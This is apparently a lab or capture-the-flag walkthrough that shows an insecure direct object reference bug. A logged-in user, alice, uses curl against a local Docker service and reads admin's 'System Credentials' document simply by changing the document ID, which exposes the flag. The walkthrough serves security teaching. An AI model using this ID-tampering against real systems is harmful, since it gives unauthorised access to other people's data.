# Finding the Bug

Start the lab:

```bash
docker compose up --build -d
```

Log in as alice and inspect the token:

```bash
curl -s -X POST http://localhost:8080/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}'
```

```json
{"token": "3f8a...", "user": "alice"}
```

List alice's own documents:

```bash
TOKEN="3f8a..."
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/documents
```

```json
{
  "documents": [
    {"id": 1, "owner_id": 1, "owner": "alice", "title": "Q3 Expense Report", "content": "Travel: $420. Meals: $85. Total: $505."}
  ],
  "note": "Your documents only"
}
```

Alice owns document 1. Try document 2 with the same token:

```bash
curl -s -H "Authorization: Bearer $TOKEN" http://localhost:8080/api/documents/2
```

```json
{
  "document": {
    "id": 2,
    "owner_id": 2,
    "owner": "admin",
    "title": "System Credentials",
    "content": "POC{...}"
  }
}
```

The server returned admin's document with no error. The token proves alice is authenticated but nothing checks that alice owns document 2. The flag is in the `content` field.
